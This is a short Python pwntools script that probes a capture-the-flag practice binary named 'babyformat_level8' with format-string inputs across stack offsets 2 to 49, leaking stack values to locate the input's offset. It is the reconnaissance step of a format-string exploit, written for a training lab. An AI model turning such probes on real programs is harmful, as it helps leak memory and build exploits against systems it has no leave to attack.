
from pwn import *

context.log_level = 'critical'
BINARY = '/challenge/babyformat_level8'

for i in range(2, 50):
    p = process(BINARY)
    p.sendline('AAAA %{}$lx %{}$p'.format(i,i))
    p.recvuntil(b"Your input is:")
    p.recvline()
    print(b'%02d: '%(i) + p.recvline()[:-1]) 
    p.close()

print('loop completed')